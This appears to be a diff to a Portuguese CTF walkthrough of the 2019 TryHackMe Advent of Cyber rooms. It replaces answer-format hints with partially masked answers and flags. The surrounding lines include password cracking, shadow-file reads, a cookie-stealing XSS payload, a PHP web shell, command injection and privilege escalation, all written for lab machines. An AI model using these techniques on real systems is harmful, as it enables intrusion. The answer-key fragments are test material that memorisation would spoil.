@@ -16,6 +16,8 @@ As tarefas 1-5 da sala são introdução e conexão. Marque-as conforme as instr
 
 Os downloads podem ter um sufixo numérico no nome. Antes de executar comandos que usam nomes curtos, renomeie o arquivo correspondente; por exemplo, `mv 'Evil Elf_'*.pcap evil-elf.pcap` e `mv tosend_*.zip tosend.zip`.
 
+Nas máscaras de resposta, `...` representa caracteres omitidos e `#` representa um dígito.
+
 ## Dia 1 - Inventory Management
 
 1. Inicie a máquina e abra `http://<IP>:3000` no navegador.
@@ -27,7 +29,7 @@ Os downloads podem ter um sufixo numérico no nome. Antes de executar comandos q
 printf %s 'mcinventory<SUFIXO_DECODIFICADO>' | base64 -w0
 ```
 
-**Formato:** nome de cookie; sufixo alfanumérico; nome de um item do pedido.
+**Respostas:** `******` (nome do cookie); `***********` (sufixo); `...` (item do pedido).
 
 ## Dia 2 - Arctic Forum
 
@@ -42,7 +44,7 @@ ffuf -u "http://$IP:3000/FUZZ" \
 curl -s "http://$IP:3000/<ROTA_ADMIN>" | grep -i -E 'github|arctic|design'
 ```
 
-**Formato:** caminho começando por `/`; senha em texto; uma palavra mencionada na mensagem.
+**Respostas:** `/...` (caminho); `...` (senha); `...` (palavra da mensagem).
 
 ## Dia 3 - Evil Elf
 
@@ -62,7 +64,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt buddy.hash
 john --show buddy.hash
 ```
 
-**Formato:** endereço IPv4; item curto; senha encontrada pelo John.
+**Respostas:** `63....` (endereço IPv4); `...` (item); `...` (senha).
 
 ## Dia 4 - Training
 
@@ -80,7 +82,7 @@ sha1sum file8
 grep '^mcsysadmin:' /var/shadow.bak
 ```
 
-**Formato:** dois números pequenos; uma palavra; um nome de arquivo; IPv4; SHA-1 de 40 caracteres hexadecimais; hash de `/etc/shadow` iniciado por `$6$`.
+**Respostas:** `#` (número de arquivos); `...` (texto do arquivo); `file#` (nome de arquivo); `10....` (endereço IPv4); `#` (número de contas); `fa6...` (SHA-1); `$6$jbo...` (hash de senha).
 
 ## Dia 5 - Ho-Ho-Hosint
 
@@ -93,7 +95,7 @@ grep '^mcsysadmin:' /var/shadow.bak
 exiftool thegrinch.jpg | grep -i -E 'creator|artist|author'
 ```
 
-**Formato:** data de nascimento; ocupação; modelo de telefone; data; nome e sobrenome. Perfis e páginas externas podem ter mudado desde 2019; nesse caso, consulte as capturas arquivadas.
+**Respostas:** `...` (data de nascimento); `...` (ocupação); `...` (modelo de telefone); `##/##/####` (data); `... ...` (nome e sobrenome). Perfis e páginas externas podem ter mudado desde 2019; nesse caso, consulte as capturas arquivadas.
 
 ## Dia 6 - Data Elf-iltration
 
@@ -112,7 +114,7 @@ steghide extract -sf TryHackMe.jpg -p ''
 cat <ARQUIVO_EXTRAIDO_PELO_STEGHIDE>
 ```
 
-**Formato:** texto da consulta DNS decodificada; palavra encontrada na lista; identificador extraído da imagem.
+**Respostas:** `...` (texto decodificado do DNS); `...` (item da lista); `...` (identificador da imagem).
 
 ## Dia 7 - Skilling Up
 
@@ -125,7 +127,7 @@ curl -s "http://$IP:<PORTA_HTTP>/"
 
 Conte as linhas `open` de portas TCP do scan. Anote o sistema operacional e a versão do OpenSSH informados pelo Nmap. Na listagem Web, identifique o arquivo solicitado.
 
-**Formato:** número inteiro; nome de sistema operacional; versão numérica; nome de arquivo com extensão.
+**Respostas:** `#` (número de portas); `...` (sistema operacional); `#.#` (versão do SSH); `*.file` (nome de arquivo).
 
 ## Dia 8 - SUID Shenanigans
 
@@ -145,7 +147,7 @@ find / -user root -perm -4000 -type f 2>/dev/null | grep system-control
 # No prompt "Enter system command": cat /root/flag2.txt
 ```
 
-**Formato:** porta TCP de cinco dígitos; duas flags no padrão `THM{32 caracteres hexadecimais}`.
+**Respostas:** `655...` (porta SSH); `THM{d3f...}` (primeira flag); `THM{8c8...}` (segunda flag).
 
 ## Dia 9 - Requests
 
@@ -172,7 +174,7 @@ else:
 print(''.join(parts))
 ```
 
-**Formato:** sequência alfabética com letras maiúsculas e minúsculas; o script imprime a resposta completa.
+**Resposta:** `...` (texto formado pelas requisições).
 
 ## Dia 10 - Metasploit-a-ho-ho-ho
 
@@ -200,7 +202,7 @@ sed -n '148p' naughty_list.txt
 sed -n '52p' nice_list.txt
 ```
 
-**Formato:** flag `THM{32 caracteres hexadecimais}`; senha de SSH; dois nomes completos extraídos das linhas indicadas.
+**Respostas:** `THM{3ad...}` (flag); `...` (senha SSH); `... ...` (nome da lista); `... ...` (outro nome da lista).
 
 ## Dia 11 - Elf Applications
 
@@ -227,7 +229,7 @@ SHOW TABLES;
 SELECT * FROM USERS;
 ```
 
-**Formato:** senha em texto do NFS; nome de arquivo com extensão do FTP; senha em texto do banco de dados.
+**Respostas:** `...` (senha no NFS); `....txt` (arquivo do FTP); `...` (senha no banco de dados).
 
 ## Dia 12 - Elfcryption
 
@@ -243,7 +245,7 @@ openssl pkeyutl -decrypt -inkey private.key \
 cat note2.txt
 ```
 
-Se a versão do OpenSSL não aceitar esse formato de chave, tente `openssl rsautl -decrypt` com os mesmos arquivos. **Formato:** MD5 de 32 caracteres hexadecimais; texto da primeira nota; flag `THM{32 caracteres hexadecimais}`.
+Se a versão do OpenSSL não aceitar esse formato de chave, tente `openssl rsautl -decrypt` com os mesmos arquivos. **Respostas:** `24c...` (MD5); `...` (texto da nota); `THM{ed9...}` (flag).
 
 ## Dia 13 - Accumulate
 
@@ -271,7 +273,7 @@ dir C:\root.txt /s /b
 type <CAMINHO_ENCONTRADO_PARA_ROOT.TXT>
 ```
 
-**Formato:** caminho começando por `/`; duas flags no padrão `THM{PALAVRAS_EM_MAIÚSCULAS}`. A terceira pergunta é opcional na plataforma.
+**Respostas:** `/...` (caminho da aplicação); `THM{...}` (flag do usuário); `THM{...}` (flag do administrador). A terceira pergunta é opcional na plataforma.
 
 ## Dia 14 - Unknown Storage
 
@@ -283,7 +285,7 @@ aws s3 cp s3://advent-bucket-one/<OBJETO_LISTADO> . --no-sign-request
 cat <OBJETO_LISTADO>
 ```
 
-Também é possível abrir `https://advent-bucket-one.s3.amazonaws.com/<OBJETO_LISTADO>` no navegador. **Formato:** nome de arquivo com extensão; nome de usuário encontrado nele.
+Também é possível abrir `https://advent-bucket-one.s3.amazonaws.com/<OBJETO_LISTADO>` no navegador. **Respostas:** `....txt` (nome do objeto); `...` (nome de usuário).
 
 ## Dia 15 - LFI
 
@@ -301,7 +303,7 @@ ssh charlie@"$IP"
 find /home/charlie -name flag1.txt -type f -exec cat {} \;
 ```
 
-**Formato:** nome de lugar; senha em texto; flag `THM{32 caracteres hexadecimais}`.
+**Respostas:** `...` (destino da viagem); `...` (senha); `THM{4ea...}` (flag).
 
 ## Dia 16 - File Confusion
 
@@ -344,7 +346,7 @@ exiftool extraidos/* | grep -i 'Version.*1\.1' | wc -l
 grep -Ril 'password' extraidos/
 ```
 
-**Formato:** dois números inteiros; nome de arquivo com extensão `.txt`. Os comandos acima mostram os valores.
+**Respostas:** `##` (número de arquivos); `#` (quantidade com o metadado); `....txt` (nome de arquivo).
 
 ## Dia 17 - Hydra-ha-ha-haa
 
@@ -362,7 +364,7 @@ ssh molly@"$IP"
 find /home/molly -iname '*flag*' -type f -exec cat {} \;
 ```
 
-**Formato:** duas senhas em texto obtidas pelo Hydra; duas flags `THM{32 caracteres hexadecimais}`.
+**Respostas:** `...` (senha Web); `...` (senha SSH); `THM{267...}` (primeira flag); `THM{c8e...}` (segunda flag).
 
 ## Dia 18 - ELF JS
 
@@ -380,7 +382,7 @@ O fórum da porta 3000 armazena notas sem neutralizar HTML. O bot administrador 
 })">
 ```
 
-Se o formulário codificar quebras de linha, escreva a carga em uma única linha. **Formato:** valor hexadecimal de 40 caracteres extraído do cookie publicado pela nota.
+Se o formulário codificar quebras de linha, escreva a carga em uma única linha. **Resposta:** `256...` (valor hexadecimal do cookie).
 
 ## Dia 19 - Commands
 
@@ -392,7 +394,7 @@ curl "http://$IP:3000/api/cmd/find%20%2F%20-name%20user.txt"
 curl "http://$IP:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt"
 ```
 
-**Formato:** sequência alfanumérica de 20 caracteres.
+**Resposta:** `5W7...` (sequência alfanumérica).
 
 ## Dia 20 - Cronjob Privilege Escalation
 
@@ -421,7 +423,7 @@ cp /home/scripts/clean_up.sh.backup /home/scripts/clean_up.sh
 rm /home/scripts/clean_up.sh.backup /home/scripts/flag2.txt
 ```
 
-**Formato:** porta TCP; duas flags `THM{32 caracteres hexadecimais}`.
+**Respostas:** `456...` (porta SSH); `THM{dec...}` (primeira flag); `THM{b27...}` (segunda flag).
 
 ## Dia 21 - Reverse Elf-ineering
 
@@ -440,7 +442,7 @@ pdf @ main
 # Veja o valor transferido para local_4h antes de eax ser zerado.
 ```
 
-Se quiser conferir dinamicamente, abra com `r2 -d challenge1`, coloque um breakpoint antes da instrução de interesse com `db <ENDEREÇO>`, avance com `dc`, leia os registradores com `dr` e a pilha com `px @ rbp-0xc` ou `px @ rbp-0x4`. **Formato:** três números inteiros pequenos, na ordem solicitada pela sala.
+Se quiser conferir dinamicamente, abra com `r2 -d challenge1`, coloque um breakpoint antes da instrução de interesse com `db <ENDEREÇO>`, avance com `dc`, leia os registradores com `dr` e a pilha com `px @ rbp-0xc` ou `px @ rbp-0x4`. **Respostas:** `#` (primeiro valor); `#` (segundo valor); `#` (terceiro valor).
 
 ## Dia 22 - If Santa, Then Christmas
 
@@ -459,7 +461,7 @@ pdf @ main
 # px @ rbp-0x4
 ```
 
-**Formato:** dois números inteiros correspondentes aos valores finais de `local_8h` e `local_4h`.
+**Respostas:** `#` (valor final de `local_8h`); `#` (valor final de `local_4h`).
 
 ## Dia 23 - LapLANd (SQL Injection)
 
@@ -494,7 +496,7 @@ if (isset($_GET['cmd'])) {
 ?>
 ```
 
-Após o upload, abra a URL indicada pela aplicação com `?cmd=cat%20%2Fhome%2Fuser%2Fflag.txt`. Apague o arquivo pelo painel ou pelo acesso obtido e confira que a URL não o executa mais. **Formato:** nome de campo; endereço de email; senha em texto; nome de estação; flag `THM{PALAVRAS_EM_MAIÚSCULAS}`.
+Após o upload, abra a URL indicada pela aplicação com `?cmd=cat%20%2Fhome%2Fuser%2Fflag.txt`. Apague o arquivo pelo painel ou pelo acesso obtido e confira que a URL não o executa mais. **Respostas:** `...` (nome do campo); `...@...` (email); `...` (senha); `...` (estação); `THM{...}` (flag).
 
 ## Dia 24 - Elf Stalk
 
@@ -516,7 +518,7 @@ curl -m 8 --path-as-is \
 curl -s "http://$IP:8000/kibana-log.txt" | tail -50
 ```
 
-**Formato:** sequência alfanumérica encontrada no índice; texto da flag registrado no log do Kibana.
+**Respostas:** `9Qs...` (sequência alfanumérica); `...` (texto encontrado no log).
 
 ## Dia 25 - Challenge-less
 
